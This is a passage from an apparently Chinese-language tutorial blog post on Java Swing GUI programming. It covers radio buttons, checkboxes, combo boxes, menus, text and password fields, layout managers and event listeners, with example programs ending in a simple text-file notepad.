<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JRadioButton jrb1=<span class="keyword">new</span> JRadioButton(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">        JRadioButton jrb2=<span class="keyword">new</span> JRadioButton(<span class="string">&quot;女&quot;</span>);</span><br><span class="line">        ButtonGroup group=<span class="keyword">new</span> ButtonGroup();</span><br><span class="line">        group.add(jrb1);</span><br><span class="line">        group.add(jrb2);</span><br><span class="line">        jf.add(jrb1);</span><br><span class="line">        jf.add(jrb2);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228001003287.png" alt="image-20211228001003287" style="zoom:67%;" />

<h5 id="复选框组件JCheckBox"><a href="#复选框组件JCheckBox" class="headerlink" title="复选框组件JCheckBox"></a>复选框组件JCheckBox</h5><p>JCheckBox构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JCheckBox(Icon icon,<span class="keyword">boolean</span> checked);<span class="comment">//指定图标,是否被选中</span></span><br><span class="line">JCheckBox(String text,<span class="keyword">boolean</span> checked);<span class="comment">//指定文字,是否被选中</span></span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout());<span class="comment">//设置流式布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JCheckBox jcb1=<span class="keyword">new</span> JCheckBox(<span class="string">&quot;摆烂&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line">        JCheckBox jcb2=<span class="keyword">new</span> JCheckBox(<span class="string">&quot;足球&quot;</span>);</span><br><span class="line">        JCheckBox jcb3=<span class="keyword">new</span> JCheckBox(<span class="string">&quot;音乐&quot;</span>);</span><br><span class="line">        JCheckBox jcb4=<span class="keyword">new</span> JCheckBox(<span class="string">&quot;睡觉&quot;</span>);</span><br><span class="line">        jf.add(jcb1);</span><br><span class="line">        jf.add(jcb2);</span><br><span class="line">        jf.add(jcb3);</span><br><span class="line">        jf.add(jcb4);</span><br><span class="line">        </span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228001621601.png" alt="image-20211228001621601" style="zoom:67%;" />

<h5 id="下拉列表组件JComboBox"><a href="#下拉列表组件JComboBox" class="headerlink" title="下拉列表组件JComboBox"></a>下拉列表组件JComboBox</h5><p>JComboBox构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JComboBox();<span class="comment">//常用</span></span><br><span class="line">JComboBox(ComboBoxModel dataModel);<span class="comment">//使用listModel建立一个下拉列表</span></span><br><span class="line">JComBox(Object[] arrayData);</span><br><span class="line">JComboBox(Vector vector);</span><br></pre></td></tr></table></figure>

<p>方法</p>
<p><code>addItem添加下拉内容</code></p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout());<span class="comment">//设置流式布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JComboBox box=<span class="keyword">new</span> JComboBox();</span><br><span class="line">        box.addItem(<span class="string">&quot;---请选择你的学历---&quot;</span>);</span><br><span class="line">        box.addItem(<span class="string">&quot;高中&quot;</span>);</span><br><span class="line">        box.addItem(<span class="string">&quot;大学&quot;</span>);</span><br><span class="line">        box.addItem(<span class="string">&quot;研究生&quot;</span>);</span><br><span class="line">        jf.add(box);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228131636660.png" alt="image-20211228131636660" style="zoom:67%;" />

<h5 id="菜单栏组件"><a href="#菜单栏组件" class="headerlink" title="菜单栏组件"></a>菜单栏组件</h5><p>JmenuBar  Jmenu  JmenuItem</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S9_3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jFrame=<span class="keyword">new</span> JFrame(<span class="string">&quot;记事本&quot;</span>);</span><br><span class="line">        jFrame.setBounds(<span class="number">500</span>,<span class="number">400</span>,<span class="number">700</span>,<span class="number">700</span>);</span><br><span class="line">        jFrame.setLayout(<span class="keyword">new</span> FlowLayout(FlowLayout.LEFT));</span><br><span class="line">        JMenuBar bar=<span class="keyword">new</span> JMenuBar();</span><br><span class="line">        JMenu menu1=<span class="keyword">new</span> JMenu(<span class="string">&quot;文件(F)&quot;</span>);</span><br><span class="line">        JMenuItem item1=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;新建&quot;</span>);</span><br><span class="line">        JMenuItem item2=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;保存&quot;</span>);</span><br><span class="line">        JMenuItem item3=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;另存为&quot;</span>);</span><br><span class="line">        menu1.add(item1);</span><br><span class="line">        menu1.add(item2);</span><br><span class="line">        menu1.add(item3);</span><br><span class="line">        JMenu menu2=<span class="keyword">new</span> JMenu(<span class="string">&quot;编辑(E)&quot;</span>);</span><br><span class="line">        JMenu menu3=<span class="keyword">new</span> JMenu(<span class="string">&quot;格式(O)&quot;</span>);</span><br><span class="line">        JMenu menu4=<span class="keyword">new</span> JMenu(<span class="string">&quot;查看(V)&quot;</span>);</span><br><span class="line">        JMenu menu5=<span class="keyword">new</span> JMenu(<span class="string">&quot;帮助(H)&quot;</span>);</span><br><span class="line">        JMenuItem item4=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;查看帮助(H)&quot;</span>);</span><br><span class="line">        JMenuItem item5=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;发送反馈(F)&quot;</span>);</span><br><span class="line">        JMenuItem item6=<span class="keyword">new</span> JMenuItem(<span class="string">&quot;关于记事本(A)&quot;</span>);</span><br><span class="line">        menu5.add(item4);</span><br><span class="line">        menu5.add(item5);</span><br><span class="line">        menu5.add(item6);</span><br><span class="line">        bar.add(menu1);</span><br><span class="line">        bar.add(menu2);</span><br><span class="line">        bar.add(menu3);</span><br><span class="line">        bar.add(menu4);</span><br><span class="line">        bar.add(menu5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        jFrame.add(bar);</span><br><span class="line">        JTextArea jTextArea=<span class="keyword">new</span> JTextArea(<span class="number">40</span>,<span class="number">63</span>);</span><br><span class="line">        jFrame.add(jTextArea);</span><br><span class="line">        jFrame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211229002557142.png" alt="image-20211229002557142" style="zoom:67%;" />

<h5 id="文本组件JTextField"><a href="#文本组件JTextField" class="headerlink" title="文本组件JTextField"></a>文本组件JTextField</h5><p>构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略,一般只用指定文字即可</span><br><span class="line">JTextField(Document docModel,String text,<span class="keyword">int</span> fieldWidth);<span class="comment">//指定文本框,文字,文本框长度</span></span><br></pre></td></tr></table></figure>

<p><code>getText();//获取输入的内容</code></p>
<h5 id="密码框组件JPasswordField"><a href="#密码框组件JPasswordField" class="headerlink" title="密码框组件JPasswordField"></a>密码框组件JPasswordField</h5><p>构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略,一般只用指定文字即可</span><br><span class="line">JPasswordField(Document docModel,String text,<span class="keyword">int</span> fieldWidth);<span class="comment">//指定文本框,文字,文本框长度</span></span><br></pre></td></tr></table></figure>

<p>常用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setEchoChar(<span class="string">&#x27;*&#x27;</span>);<span class="comment">//设置回显字符</span></span><br><span class="line">getText();<span class="comment">//获取输入的内容</span></span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout(FlowLayout.LEFT));<span class="comment">//设置流式布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JLabel jlabel1=<span class="keyword">new</span> JLabel(<span class="string">&quot;账号:&quot;</span>);</span><br><span class="line">        JTextField username=<span class="keyword">new</span> JTextField(<span class="number">10</span>);</span><br><span class="line">        jf.add(jlabel1);</span><br><span class="line">        jf.add(username);</span><br><span class="line">        JLabel jlabel2=<span class="keyword">new</span> JLabel(<span class="string">&quot;密码:&quot;</span>);</span><br><span class="line">        JPasswordField password=<span class="keyword">new</span> JPasswordField(<span class="number">10</span>);</span><br><span class="line">        password.setEchoChar(<span class="string">&#x27;*&#x27;</span>);<span class="comment">//设置回显字符</span></span><br><span class="line"></span><br><span class="line">        jf.add(jlabel2);</span><br><span class="line"></span><br><span class="line">        jf.add(password);</span><br><span class="line"></span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228133823317.png" alt="image-20211228133823317" style="zoom:67%;" />

<h5 id="文本域组件JTextArea"><a href="#文本域组件JTextArea" class="headerlink" title="文本域组件JTextArea"></a>文本域组件JTextArea</h5><p>构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JTextArea(Document doc,String text,<span class="keyword">int</span> rows,<span class="keyword">int</span> cols);<span class="comment">//指定文本模型,默认文字,长,宽</span></span><br></pre></td></tr></table></figure>

<p>常用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setLineWrap();<span class="comment">//设置文本域是否自动换行true or false</span></span><br><span class="line">getText();<span class="comment">//获取输入的内容</span></span><br></pre></td></tr></table></figure>

<h4 id="常用布局"><a href="#常用布局" class="headerlink" title="常用布局"></a>常用布局</h4><h5 id="流布局FlowLayout"><a href="#流布局FlowLayout" class="headerlink" title="流布局FlowLayout"></a>流布局FlowLayout</h5><p>所有组件像流一样,一个一个排放,排满一行之后排下一行,默认情况下,每个组件是居中排列的,但是也可以设置</p>
<p>构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//参数都可省略,一般只写对齐方式</span></span><br><span class="line">FlowLayout(<span class="keyword">int</span> aligment,<span class="keyword">int</span> horizGap,<span class="keyword">int</span> vertGap);<span class="comment">//设置对齐方式,上下偏移</span></span><br><span class="line">aligment取值:</span><br><span class="line">FlowLayout.LEFT=<span class="number">0</span>;</span><br><span class="line">FlowLayout.CENTER=<span class="number">1</span>;</span><br><span class="line">FlowLayout.RIGHT=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<h5 id="边界布局BorderLayout"><a href="#边界布局BorderLayout" class="headerlink" title="边界布局BorderLayout"></a>边界布局BorderLayout</h5><p>边界布局是默认的布局管理方式,边界布局将容器分成了东<code>BorderLayout.NORTH</code>,南,西,北,中5个区域</p>
<p>在add的时候指定边界</p>
<p><code>jf.add(button,BorderLayout.NORTH);</code></p>
<img src="/images/java-ui/image-20211228135034235.png" alt="image-20211228135034235" style="zoom:67%;" />

<h5 id="网格布局GridLayout"><a href="#网格布局GridLayout" class="headerlink" title="网格布局GridLayout"></a>网格布局GridLayout</h5><p>将容器划分为网格,网格个数由行和列决定,每个组件会填满空格,改变容器大小,组件的大小也会随之改变</p>
<p>构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GridLayout(<span class="keyword">int</span> rows,<span class="keyword">int</span> columns,<span class="keyword">int</span> horizGap,<span class="keyword">int</span> vertGap);<span class="comment">//指定行数,列数,水平间隔.垂直间隔</span></span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>));<span class="comment">//设置网格布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;test&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JButton jButton1=<span class="keyword">new</span> JButton(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        JButton jButton2=<span class="keyword">new</span> JButton(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        JButton jButton3=<span class="keyword">new</span> JButton(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        JButton jButton4=<span class="keyword">new</span> JButton(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">        JButton jButton5=<span class="keyword">new</span> JButton(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">        JButton jButton6=<span class="keyword">new</span> JButton(<span class="string">&quot;F&quot;</span>);</span><br><span class="line">        JButton jButton7=<span class="keyword">new</span> JButton(<span class="string">&quot;G&quot;</span>);</span><br><span class="line">        JButton jButton8=<span class="keyword">new</span> JButton(<span class="string">&quot;H&quot;</span>);</span><br><span class="line">        jf.add(jButton1);</span><br><span class="line">        jf.add(jButton2);</span><br><span class="line">        jf.add(jButton3);</span><br><span class="line">        jf.add(jButton4);</span><br><span class="line">        jf.add(jButton5);</span><br><span class="line">        jf.add(jButton6);</span><br><span class="line">        jf.add(jButton7);</span><br><span class="line">        jf.add(jButton8);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228135556932.png" alt="image-20211228135556932" style="zoom:67%;" />

<h4 id="常用的事件监听器"><a href="#常用的事件监听器" class="headerlink" title="常用的事件监听器"></a>常用的事件监听器</h4><p>一个事件模型中有三个对象:事件源,事件,以及监听程序</p>
<h5 id="事件监听机制"><a href="#事件监听机制" class="headerlink" title="事件监听机制"></a>事件监听机制</h5><ul>
<li>事件源    事件发生的地方</li>
<li>事件        要发生的事情</li>
<li>事件处理 针对发生的事情做出的处理方案</li>
<li>事件监听 把事件源和事件关联起来</li>
</ul>
<h5 id="两种监听器"><a href="#两种监听器" class="headerlink" title="两种监听器"></a>两种监听器</h5><table>
<thead>
<tr>
<th></th>
<th>事件</th>
<th>事件源</th>
<th>监听接口</th>
<th>方法</th>
</tr>
</thead>
<tbody><tr>
<td>动作事件监听器</td>
<td>ActionEvent</td>
<td>JButton,JlistmJTextField等</td>
<td>ActionListener</td>
<td>addActionListener(),removeActionListener()</td>
</tr>
<tr>
<td>焦点事件监听器</td>
<td>FocusEvent</td>
<td>Component及其派生</td>
<td>FocusListener</td>
<td>addFocusListener(),removeFocusListener()</td>
</tr>
</tbody></table>
<p>使用步骤</p>
<ol>
<li>新建一个组件(如Button)</li>
<li>将该组件添加到相应的面板(如JFrame)</li>
<li>注册监听器以监听事件源产生的事件(如通过ActionListener来响应用户点击按钮)</li>
<li>定义处理事件的方法(如在ActionListener中的actionPerformed中定义响应的方法)</li>
</ol>
<p><strong>一般用匿名内部类方式实现</strong></p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jla.addFocusListener(<span class="keyword">new</span> FocusListener()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">focusLost</span><span class="params">(FocusEvent e)</span></span>&#123;</span><br><span class="line">        <span class="comment">//失去焦点的时候做的事情</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">focusGained</span><span class="params">(FocusEvent e)</span></span>&#123;</span><br><span class="line">        <span class="comment">//获取焦点的时候做的事情</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jb.addActionListener(<span class="keyword">new</span> ActionListener()&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">     <span class="comment">//单击鼠标时执行   </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout());<span class="comment">//设置网格布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;test&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JTextArea jTextArea=<span class="keyword">new</span> JTextArea();</span><br><span class="line">        jTextArea.setLineWrap(<span class="keyword">true</span>);</span><br><span class="line">        JButton jButton=<span class="keyword">new</span> JButton(<span class="string">&quot;希望你对你对人生也是这个态度&quot;</span>);</span><br><span class="line">        jf.add(jTextArea);</span><br><span class="line">        jf.add(jButton);</span><br><span class="line">        jButton.addActionListener(<span class="keyword">new</span> AbstractAction() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                jTextArea.append(<span class="string">&quot;啊对对对&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228141558056.png" alt="image-20211228141558056" style="zoom:67%;" />

<h5 id="综合实践"><a href="#综合实践" class="headerlink" title="综合实践"></a>综合实践</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.filechooser.FileNameExtensionFilter;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S9_2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> String path;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readText</span><span class="params">(String path,Object obj)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        JTextArea jTextArea=(JTextArea) obj;</span><br><span class="line">        FileReader fileReader=<span class="keyword">new</span> FileReader(path);</span><br><span class="line">        BufferedReader bufferedReader=<span class="keyword">new</span> BufferedReader(fileReader);</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line=bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            jTextArea.append(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">        fileReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saveText</span><span class="params">(String path,Object obj)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        JTextArea jTextArea=(JTextArea) obj;</span><br><span class="line">        BufferedWriter bufferedWriter=<span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(path));</span><br><span class="line">        bufferedWriter.write(jTextArea.getText());</span><br><span class="line">        bufferedWriter.flush();</span><br><span class="line">        bufferedWriter.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jFrame=<span class="keyword">new</span> JFrame(<span class="string">&quot;S9_2&quot;</span>);</span><br><span class="line">        jFrame.setLayout(<span class="keyword">new</span> FlowLayout(FlowLayout.CENTER));</span><br><span class="line">        jFrame.setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">600</span>,<span class="number">500</span>);</span><br><span class="line">        JTextArea jTextArea=<span class="keyword">new</span> JTextArea(<span class="number">20</span>,<span class="number">50</span>);</span><br><span class="line">        JTextField jTextField=<span class="keyword">new</span> JTextField(<span class="number">35</span>);</span><br><span class="line">        <span class="comment">//把文本域放进jScrollPane让其拥有滚动条</span></span><br><span class="line">        JScrollPane jScrollPane=<span class="keyword">new</span> JScrollPane(jTextArea);</span><br><span class="line">        JLabel jLabel=<span class="keyword">new</span> JLabel(<span class="string">&quot;File:&quot;</span>);</span><br><span class="line">        JButton Browse=<span class="keyword">new</span> JButton(<span class="string">&quot;Browse&quot;</span>);</span><br><span class="line">        Browse.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                </span><br><span class="line">             	<span class="comment">//文件选择组件</span></span><br><span class="line">                JFileChooser chooser =<span class="keyword">new</span> JFileChooser(<span class="string">&quot;C:/&quot;</span>);</span><br><span class="line">                FileNameExtensionFilter filter = <span class="keyword">new</span> FileNameExtensionFilter(</span><br><span class="line">                        <span class="string">&quot;文本文档&quot;</span>, <span class="string">&quot;txt&quot;</span>);</span><br><span class="line">                chooser.setFileFilter(filter);</span><br><span class="line">                <span class="keyword">int</span> returnVal = chooser.showOpenDialog(jFrame);</span><br><span class="line">                <span class="keyword">if</span>(returnVal == JFileChooser.APPROVE_OPTION) &#123;</span><br><span class="line">                    path=chooser.getSelectedFile().getAbsolutePath();</span><br><span class="line">                    jTextField.setText(path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        JButton Clear=<span class="keyword">new</span> JButton(<span class="string">&quot;Clear&quot;</span>);</span><br><span class="line">        Clear.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                jTextArea.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        JButton Read=<span class="keyword">new</span> JButton(<span class="string">&quot;Read&quot;</span>);</span><br><span class="line">        Read.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    readText(path,jTextArea);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        JButton Save=<span class="keyword">new</span> JButton(<span class="string">&quot;Save&quot;</span>);</span><br><span class="line">        Save.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    saveText(path,jTextArea);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        JButton Exit=<span class="keyword">new</span> JButton(<span class="string">&quot;Exit&quot;</span>);</span><br><span class="line">        Exit.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">         